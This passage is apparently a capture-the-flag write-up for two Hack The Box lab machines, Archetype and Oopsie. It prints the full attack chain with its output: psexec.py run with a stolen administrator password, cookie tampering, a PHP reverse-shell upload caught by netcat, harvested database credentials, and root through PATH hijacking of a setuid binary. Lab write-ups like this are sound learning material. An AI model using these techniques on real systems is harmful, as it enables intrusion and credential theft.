net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```
It appears we now have the credentials for the administrator!

```
USERNAME: administrator 
PASSWORD: MEGACORP_4dm1n!!
```
We can now use these credentials to get into SMB, except now as an ADMIN:

```
└─$ python /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.95.187
   
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Password: MEGACORP_4dm1n!!

[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file CcqGgESI.exe
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service dDwb on 10.129.95.187.....
[*] Starting service dDwb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
Now to grab our sixteenth flag!

```
C:\Windows\system32> cd ..
 

C:\Windows> cd ..
 
C:\> cd users
 
C:\Users> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users

01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
01/19/2020  11:39 PM    <DIR>          Administrator
01/19/2020  11:39 PM    <DIR>          Public
01/20/2020  06:01 AM    <DIR>          sql_svc
               0 File(s)              0 bytes
               5 Dir(s)  10,703,216,640 bytes free

C:\Users> cd Administrator
 
C:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator

01/19/2020  11:39 PM    <DIR>          .
01/19/2020  11:39 PM    <DIR>          ..
07/27/2021  02:30 AM    <DIR>          3D Objects
07/27/2021  02:30 AM    <DIR>          Contacts
07/27/2021  02:30 AM    <DIR>          Desktop
07/27/2021  02:30 AM    <DIR>          Documents
07/27/2021  02:30 AM    <DIR>          Downloads
07/27/2021  02:30 AM    <DIR>          Favorites
07/27/2021  02:30 AM    <DIR>          Links
07/27/2021  02:30 AM    <DIR>          Music
07/27/2021  02:30 AM    <DIR>          Pictures
07/27/2021  02:30 AM    <DIR>          Saved Games
07/27/2021  02:30 AM    <DIR>          Searches
07/27/2021  02:30 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  10,703,216,640 bytes free

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,703,216,640 bytes free

C:\Users\Administrator\Desktop> type root.txt

b91ccec3305e98240082d4474b848528
```


## Conclusions - Level 1 Archtype

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	winPEAS   |    	Windows  privilege escalation  |
| 3 | 	netcat   |    	host listening to establish a reverse shell |  
| 4 | 	MYSQLCLIENT.PY    |    	Logging into MYSQL database | 
| 5 | 	PSEXEC.PY    |    	Administrative full shell acess | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Insecure Password Storage  |    	X |  |  |  |

Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the users credentials from a stored file. We then used those credentials to log into MYSQL, where were able access a command line execution. Using netcat, we were then able to establish a reverse shell in order to find the user flag. We then used winPEAS, where we found the ADMIN credentials. Finally, we used those credentials in PSEXEC.PY in order to have full administrative access and grab the admin flag.

[Table of Contents](#table-of-contents)





## Level 2: Oopsie

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| :-----------: | :-----------: | :-----------: |
| 1 | 	IP Address   |    	10.129.9.103   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.9.103 

PING 10.129.9.103 (10.129.9.103) 56(84) bytes of data.
64 bytes from 10.129.9.103: icmp_seq=1 ttl=63 time=5.90 ms
64 bytes from 10.129.9.103: icmp_seq=2 ttl=63 time=12.1 ms
64 bytes from 10.129.9.103: icmp_seq=3 ttl=63 time=11.0 ms
64 bytes from 10.129.9.103: icmp_seq=4 ttl=63 time=9.80 ms

--- 10.129.9.103 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 5.899/9.708/12.137/2.349 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: probe open ports to determine service/version info
-O: operating system information
```
The results of nmap are:

```
└─$ sudo nmap -p- --min-rate 3000 -sC -sV -O  10.129.9.103 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-29 14:42 EDT
Nmap scan report for 10.129.9.103
Host is up (0.0092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/29%OT=22%CT=1%CU=42247%PV=Y%DS=2%DC=I%G=Y%TM=62E42A2
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.37 seconds

```
Our scan shows exactly two ports the can be explored. Theese ports are represented as  22 (SSH) and 80 (Web Server)

We can start by checking out the web page being hosted:


![Screenshot_2022-07-29_16_16_52](https://user-images.githubusercontent.com/59018247/181837140-4d5a929e-2b31-40cf-9a01-a367620e8576.png)


We see a pretty typical website, running PHP on the backend. As we scroll down, we notice mention of a potential login page!


![Screenshot_2022-07-29_16_18_51](https://user-images.githubusercontent.com/59018247/181837359-f2f2f541-f962-453b-89fc-0d42e6b78d72.png)

Since it appears there is no link access directly from the webpage, we can try running gobuster:

```
└─$ sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u 10.129.9.103

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.9.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/29 16:09:39 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.129.9.103/images/]
/themes               (Status: 301) [Size: 313] [--> http://10.129.9.103/themes/]
/uploads              (Status: 301) [Size: 314] [--> http://10.129.9.103/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.9.103/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.129.9.103/js/]     
/fonts                (Status: 301) [Size: 312] [--> http://10.129.9.103/fonts/]  
                                                                                  
===============================================================
2022/07/29 16:10:59 Finished
===============================================================
```

Unfortunatly, Gobuster does not turn up any login results. It does however show ```/uploads```, which is not viewable with our current set of permissions.

Another idea would be to try accessing the site using a proxy like burpe suite, to see if we can uncover any more information:


![Screenshot_2022-07-29_16_25_26](https://user-images.githubusercontent.com/59018247/181838167-fa262a86-10bb-447c-8bbf-626a9b990876.png)

When using a proxy to launch the site, we notice a get request from the url ```/cdn-cgi/login/script.js```.

We can try to append this url into the browser:


![Screenshot_2022-07-29_16_28_50](https://user-images.githubusercontent.com/59018247/181838565-b0994c8e-bf21-4430-84ff-120f8e9cdd83.png)


It looks like a success! We can try the login as guest option:


![Screenshot_2022-07-29_16_30_58](https://user-images.githubusercontent.com/59018247/181838866-e75ec7d5-2c81-44a0-8d6c-48ba51fb761a.png)


We see two interesting pieces of information:

 1. In Burp Suite we see cookie information ```Cookie: user=2233; role=guest```
 2. On the website we see the user guess idea is also that same number, along with the url at the top mentions ```id=2```

We can try to alter the URL in order to possibly change account IDS:

![Screenshot_2022-07-29_16_34_19](https://user-images.githubusercontent.com/59018247/181839286-3b958c13-907a-4534-99c1-ecd9366fac07.png)

Doing so revealed sensitive admin credentials! We can now use that access ID in burp suite to alter how guest ID cookie: 

```
Cookie: user=34322; role=admin
```

Modifying the information in the proxy has given us access to the uploads page.

![Screenshot_2022-07-29_16_37_46](https://user-images.githubusercontent.com/59018247/181839701-25ccdf62-bb17-4254-a7ff-c00df40972fd.png)

Since we noticed earlier the backend was running on PHP, we can try to force a file upload containing PHP script that will grant us a reverse shell. We can use php-reverse-shell which comes pre installed on Kali:

![Screenshot_2022-07-29_16_59_15](https://user-images.githubusercontent.com/59018247/181842269-4526c863-8ca5-4f19-a598-dfdd7928d8f0.png)


Since we have the payload ready, we can try to see if it uploads:


![Screenshot_2022-07-29_16_49_05](https://user-images.githubusercontent.com/59018247/181841040-fceff3e3-3947-46dd-84c6-35b8394e64a4.png)

It looks like it was a success! If we remember earlier, we noticed there was a /uploads directory they were found using gobuster. We can see if that was the location where the payload ended up.

First, let's run netcat on our machine to listen:

```
└─$ nc -lvnp 1333  

listening on [any] 1333 ...
```

Nest, we can try accessing the file through the browser:

```
http://10.129.9.103/uploads/php-reverse-shell.php
```
On our listener it appears to be a success!

```
connect to [10.10.14.136] from (UNKNOWN) [10.129.9.103] 49474
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:01:17 up  2:36,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Since this is a linux server, we can use this opportunity to get a full shell:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@oopsie:/$ 

```

```
www-data@oopsie:/$ cd var

www-data@oopsie:/var$ ls

backups  crash  local  log   opt  snap   tmp
cache    lib    lock   mail  run  spool  www

www-data@oopsie:/var$ cd www

www-data@oopsie:/var/www$ ls

html

www-data@oopsie:/var/www$ cd html 

www-data@oopsie:/var/www/html$ ls

cdn-cgi  css  fonts  images  index.php  js  themes  uploads

www-data@oopsie:/var/www/html$ cd cdn-cgi

www-data@oopsie:/var/www/html/cdn-cgi$ ls

login

www-data@oopsie:/var/www/html/cdn-cgi$ cd login

www-data@oopsie:/var/www/html/cdn-cgi/login$ ls

admin.php  db.php  index.php  script.js

cat db.php

<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```
 We found a username and password in the db file. 

We can test if it is a valid user login for this machine:

```
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$ 
```
It appears to be a success! Now we can check for our first user flag:

```
robert@oopsie:/var/www/html/cdn-cgi/login$ cd

robert@oopsie:~$ ls

user.txt

robert@oopsie:~$ cat user.txt

f2c74ee8db7983851ab2a96a44eb7981
```
We can see here we have access to our seventeeth flag!

Now we can try to advance out privilege to root:

```
robert@oopsie:~$ sudo -l
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
```
Unfortunately, this user does not have SUDO permissions.

We can check ```id``` to see other potential users we can maybe mover to laterally.

```
robert@oopsie:~$ id

uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
We see here there is ```bugtracker``` who is also part of the group.

We can investigate of there are any related files to this group user:

```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null

/usr/bin/bugtracker

robert@oopsie:~$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```
We can see here from the output that this user has root access. We can see if we can somehow exploit their permissions:

```
robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory


```
Here we may be able to exploit the cat command into giving us what we want. If we alter the cat command to instead launch a shell (coming from bugtracker would make it a root shell), we can trick it into giving us root access.

```
robert@oopsie:~$ cd ..

robert@oopsie:/home$ ls

robert

robert@oopsie:/home$ cd ..

robert@oopsie:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var

robert@oopsie:/$ cd tmp

robert@oopsie:/tmp$ echo '/bin/sh' > cat

robert@oopsie:/tmp$ ls

cat

robert@oopsie:/tmp$ chmod +x cat 

robert@oopsie:/tmp$ export PATH=/tmp:$PATH

robert@oopsie:/tmp$ echo $PATH

/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
Now that we have it set up, we can try ro relaunch bugtracker:

```
robert@oopsie:/tmp$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

# whoami

root

# ls

ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var

# cd root

# ls

reports  root.txt

# head root.txt

af13b0bee69f8a877c3faf667f7beacf
```
 We see here we finally have access to our eighteenth flag!
 
 ## Conclusions - Level 2 Oopsie

| # | 	Tools 	| Description |
| :-----------: | :-----------: | :-----------: |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
| 2 | 	burpsuite   |    	Web proxy intercept  |
| 3 | 	netcat   |    	host listening to establish a reverse shell |  


| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| :-----------: | :-----------: | :-----------: | :-----------: | :-----------: | :-----------: |
| 1 | 	Insecure cookie handling  |    	X |  |  |  |
| 2 | 	File upload type validation  |    	X |  |  |  |

Using nmap, we were able to discover the host was running an website on port 80. We were then able to get access to a login page using the url we found in burpsuite. We then used a guest login to enter, and manipulated the cookie storage to gain admin access. From there, we had access to an upload page, where we uploaded a php script onto the server and used netcat to relay a reverse shell.

We then were able to find login credentials in the web folder for a user, which gave us the user flag. Analyzing the group list, we then found another user in the group who we exploited via the cat commanded to give us root access to the system; thereby giving us the final admin flag.

[Table of Contents](#table-of-contents)
